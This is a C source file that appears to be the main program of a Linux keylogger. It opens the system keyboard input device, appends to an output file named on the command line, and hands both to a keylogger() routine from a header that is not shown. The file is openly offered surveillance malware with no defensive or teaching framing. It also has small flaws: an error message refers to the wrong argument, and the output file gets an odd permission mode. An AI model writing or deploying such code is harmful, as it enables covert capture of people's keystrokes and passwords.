#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"

int main(int argc, char *argv[]){
    const char KEYBOARD_DEVICE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    int writeout;
    int keyboard;

    if(argc != 2){
        printf("Usage: %s [WRITEOUT-FILE]\n", argv[0]);
        return 1;
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }
    if((writeout = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
        printf("Error opening file %s: %s\n", argv[2], strerror(errno));
        return 1;
    }

    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);

    return 0;
}
